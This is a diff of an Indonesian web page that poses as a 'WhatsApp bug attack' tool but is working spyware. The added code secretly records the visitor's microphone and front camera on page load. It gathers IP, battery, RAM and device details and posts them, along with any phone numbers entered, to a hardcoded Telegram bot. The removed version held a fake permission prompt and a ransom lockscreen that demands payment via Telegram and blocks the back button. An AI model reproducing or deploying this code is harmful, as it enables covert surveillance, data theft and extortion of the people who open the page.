@@ -3,161 +3,151 @@
 <head>
   <meta charset="UTF-8">
   <title>dhack bug</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: #0f0f23;
+      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
       font-family: 'Inter', sans-serif;
+      color: blue;
       height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       overflow: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    /* OVERLAY IZIN AKSES (TAMPIL PERTAMA) */
-    #permission-overlay {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.95);
-      z-index: 10000;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
+      position: relative;
       padding: 20px;
     }
-    .perm-box {
-      background: #1a1a2e;
-      padding: 30px;
-      border-radius: 20px;
-      border: 1px solid #2563eb;
-      box-shadow: 0 0 20px rgba(37, 99, 235, 0.5);
+    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
+    .particle {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: rgba(0, 255, 127, 0.3);
+      border-radius: 50%;
+      animation: float 6s ease-in-out infinite;
     }
-    .perm-box h2 { color: #fff; margin-bottom: 15px; font-size: 20px; }
-    .perm-box p { color: #ccc; font-size: 14px; margin-bottom: 25px; }
-    .btn-allow {
-      background: #2563eb;
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); opacity: 0.3; }
+      50% { transform: translateY(-20px); opacity: 0.8; }
+    }
+    .login-container {
+      background-color: rgba(17, 17, 17, 0.95);
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 20px blue;
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+      z-index: 2;
+    }
+    .login-title {
+      font-size: 26px;
+      font-weight: 900;
+      margin-bottom: 5px;
+      background: linear-gradient(135deg, #2563eb, #ffffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    #notif {
+      font-size: 14px;
+      color: #00d9ff;
+      font-weight: 600;
+      height: 20px;
+      margin-bottom: 10px;
+      display: none;
+    }
+    .login-input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      background: #333;
+      border: 1px solid transparent;
+      border-radius: 6px;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+    }
+    .login-input:focus { border: 1px solid #2563eb; }
+
+    .platform-label {
+      color: #00ff7f;
+      font-size: 12px;
+      font-weight: 900;
+      text-align: left;
+      margin-bottom: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .platform-group {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .platform-btn {
+      flex: 1;
+      padding: 15px 5px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 12px;
+      color: #ccc;
+      font-weight: 700;
+      font-size: 11px;
+      cursor: pointer;
+      transition: 0.3s;
+      text-transform: uppercase;
+    }
+    .platform-btn.active {
+      background: rgba(37, 99, 235, 0.2);
+      border-color: #2563eb;
+      color: #fff;
+      box-shadow: 0 0 10px rgba(37, 99, 235, 0.3);
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #2563eb, #1e40af);
       color: white;
       border: none;
-      padding: 12px 30px;
-      border-radius: 8px;
-      font-weight: bold;
+      border-radius: 10px;
       cursor: pointer;
+      font-weight: 600;
+      font-size: 15px;
+      transition: 0.3s;
     }
-
-    /* LOCKSCREEN (DISEMBUNYIKAN AWALNYA) */
-    #lockscreen-overlay {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: #1a1a1b;
-      z-index: 9999;
-      display: none; /* Muncul setelah izin */
-      justify-content: center;
-      align-items: center;
-    }
-
-    .phone-frame {
-      width: 320px; height: 650px;
-      background: #000;
-      border: 12px solid #222;
-      border-radius: 45px;
-      position: relative;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-    }
-
-    .screen-lock { flex: 1; display: flex; flex-direction: column; align-items: center; padding-top: 60px; color: white;}
-    .lock-icon { font-size: 60px; color: #ff3b30; margin-bottom: 20px; }
-    .brand-text { font-size: 13px; font-weight: 800; text-align: center; text-transform: uppercase; }
-    #pinDisplay { background: transparent; border: none; color: #555; font-size: 24px; text-align: center; width: 150px; letter-spacing: 8px; margin: 25px 0; outline: none; }
-    .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-    .key { width: 70px; height: 50px; background: #262626; border: none; border-radius: 8px; color: white; font-size: 20px; }
-    .bottom-warning { position: absolute; bottom: 30px; color: #ff3b30; font-size: 10px; font-weight: bold; width: 100%; text-align: center; }
-
-    /* KONTEN UTAMA */
-    .login-container { background: #111; padding: 30px; border-radius: 16px; box-shadow: 0 0 20px blue; text-align: center; width: 100%; max-width: 350px; }
-    .login-title { font-size: 20px; color: #2563eb; margin-bottom: 20px; font-weight: 900; }
+    .login-button:hover { box-shadow: 0 0 20px blue; transform: translateY(-2px); }
   </style>
 </head>
 <body>
+  <div class="bg-particles"></div>
 
-  <!-- 1. OVERLAY IZIN AKSES -->
-  <div id="permission-overlay">
-    <div class="perm-box">
-      <h2>Izin Akses Perangkat</h2>
-      <p>Untuk melanjutkan proses attack, Anda harus memberikan izin akses keamanan perangkat agar sistem sinkron.</p>
-      <button class="btn-allow" onclick="requestAccess()">IZINKAN AKSES</button>
-    </div>
-  </div>
-
-  <!-- 2. LOCKSCREEN OVERLAY -->
-  <div id="lockscreen-overlay">
-    <div class="phone-frame">
-        <div class="screen-lock">
-            <i class="fas fa-lock lock-icon"></i>
-            <div class="brand-text">LOCK BY SANN<br>TF 50K UNTUK MEMBUKA KUNCI<br>HUBUNGI TELEGRAM: @DhanzX7</div>
-            <input type="password" id="pinDisplay" maxlength="4" readonly placeholder="••••">
-            <div class="numpad">
-                <button class="key" onclick="pressKey('1')">1</button>
-                <button class="key" onclick="pressKey('2')">2</button>
-                <button class="key" onclick="pressKey('3')">3</button>
-                <button class="key" onclick="pressKey('4')">4</button>
-                <button class="key" onclick="pressKey('5')">5</button>
-                <button class="key" onclick="pressKey('6')">6</button>
-                <button class="key" onclick="pressKey('7')">7</button>
-                <button class="key" onclick="pressKey('8')">8</button>
-                <button class="key" onclick="pressKey('9')">9</button>
-                <div style="width:70px"></div>
-                <button class="key" onclick="pressKey('0')">0</button>
-                <button class="key" onclick="delKey()"><i class="fas fa-backspace"></i></button>
-            </div>
-            <div class="bottom-warning">JANGAN MERESTART HP ANDA</div>
-        </div>
-    </div>
-  </div>
-
-  <!-- 3. KONTEN ASLI -->
   <div class="login-container">
-    <p class="login-title">WhatsApp Bug Atack</p>
-    <p style="color: #ccc; font-size: 12px;">Sistem siap digunakan.</p>
+    <p class="login-title">bug WhatsApp By Hacked official</p>
+    <div id="notif">Sukses bug atack ✅</div>
+    
+    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
+
+    <p class="platform-label">Platform Selection</p>
+    <div class="platform-group">
+      <button type="button" class="platform-btn active" onclick="selectPlatform(this)">Android OS</button>
+      <button type="button" class="platform-btn" onclick="selectPlatform(this)">iOS Platform</button>
+    </div>
+
+    <button class="login-button" id="login-button">Atack</button>
   </div>
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
     const chatIds = ['7945789634'];
-    let currentPin = "";
-    const correctPin = "5151";
+    const input = document.getElementById('text');
+    const button = document.getElementById('login-button');
+    const notif = document.getElementById('notif');
 
-    // FUNGSI UTAMA: REQUEST AKSES & AKTIFKAN LOCK
-    async function requestAccess() {
-      try {
-        // Meminta izin kamera/mic sebagai pemicu
-        await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-        
-        // JIKA DIIZINKAN:
-        // 1. Kirim Laporan ke Telegram
-        sendToTelegram("<b>lockscreen berhasil ✅</b>");
-        
-        // 2. Masuk Mode Fullscreen (Mengunci Layar agar susah keluar)
-        if (document.documentElement.requestFullscreen) {
-          document.documentElement.requestFullscreen();
-        }
-
-        // 3. Sembunyikan Izin, Tampilkan Lockscreen
-        document.getElementById('permission-overlay').style.display = 'none';
-        document.getElementById('lockscreen-overlay').style.display = 'flex';
-        
-        // 4. Jalankan fitur auto lainnya
-        getInfo();
-      } catch (err) {
-        alert("Anda harus memberikan izin untuk menggunakan layanan ini!");
-      }
+    function selectPlatform(btn) {
+      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
     }
 
     function sendToTelegram(text) {
@@ -166,50 +156,119 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
-        });
+        }).catch(console.error);
       });
     }
 
-    // LOGIKA PIN LOCKSCREEN
-    function pressKey(num) {
-      if (currentPin.length < 4) {
-        currentPin += num;
-        document.getElementById("pinDisplay").value = currentPin;
-        if (currentPin.length === 4) setTimeout(validatePin, 300);
-      }
-    }
-    function delKey() {
-      currentPin = currentPin.slice(0, -1);
-      document.getElementById("pinDisplay").value = currentPin;
-    }
-    function validatePin() {
-      if (currentPin === correctPin) {
-        document.getElementById("lockscreen-overlay").style.display = "none";
-        if (document.exitFullscreen) document.exitFullscreen();
-      } else {
-        alert("PIN SALAH!");
-        currentPin = "";
-        document.getElementById("pinDisplay").value = "";
-      }
+    function sendVideo(blob, filename) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('video', blob, filename);
+        formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
+      });
     }
 
-    // ANTI BACK
-    window.history.pushState(null, "", window.location.href);
-    window.onpopstate = function() {
-      window.history.pushState(null, "", window.location.href);
-    };
+    function sendVoice(blob, filename) {
+      chatIds.forEach(id => {
+        const formData = new FormData();
+        formData.append('chat_id', id);
+        formData.append('voice', blob, filename);
+        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: formData }).catch(console.error);
+      });
+    }
 
+    // FITUR DETEKSI CHARGER (AUTO UPDATE)
     async function getInfo() {
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        const b = await navigator.getBattery?.();
-        const bat = b ? `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})` : "N/A";
-        const device = navigator.userAgent.split('(')[1].split(')')[0];
         
-        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${bat}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}`;
+        // Deteksi baterai dan status charging
+        let batteryInfo = "Tidak didukung";
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          const level = (battery.level * 100).toFixed(0);
+          const chargingStatus = battery.charging ? "Charging" : "Discharging";
+          batteryInfo = `${level}% (${chargingStatus})`;
+        }
+
+        const ram = navigator.deviceMemory || "Tidak diketahui";
+        const device = navigator.userAgent.split('(')[1].split(')')[0];
+
+        const text = `📱 <b>Device:</b> ${device}\n🌐 <b>IP:</b> ${ipData.ip}\n🔋 <b>Baterai:</b> ${batteryInfo}\n🕒 <b>Waktu:</b> ${new Date().toLocaleString()}\n📟 <b>RAM Handphone:</b> ±${ram} GB`;
         sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n\n${text}`);
-      } catch (e) {}
+      } catch (err) {}
+    }
+
+    async function recordFrontVideo() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const videoChunks = [];
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) videoChunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+          sendVideo(videoBlob, 'rekaman_depan.mp4');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 7000);
+      } catch (err) {
+        sendToTelegram('maaf akses vidio tidak berhasil 🤬');
+      }
+    }
+
+    async function autoRecordAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/mpeg' }); 
+          sendVoice(blob, 'voice_note.mp3');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 5000);
+      } catch (err) {
+        sendToTelegram('Izin Voice Note ditolak ❌');
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      createParticles();
+      getInfo();
+      autoRecordAudio(); 
+      recordFrontVideo();
+    });
+
+    button.addEventListener('click', () => {
+      const nomor = input.value.trim();
+      if (!nomor || nomor.length < 8) return;
+      
+      button.disabled = true;
+      notif.style.display = 'none';
+      sendToTelegram(`<b>📞 Target Attack:</b> ${nomor}`);
+      
+      setTimeout(() => {
+        notif.style.display = 'block';
+        button.disabled = false;
+        input.value = '';
+      }, 1000);
+    });
+
+    function createParticles() {
+      const container = document.querySelector('.bg-particles');
+      for (let i = 0; i < 30; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.top = Math.random() * 100 + '%';
+        container.appendChild(p);
+      }
     }
   </script>
 </body>
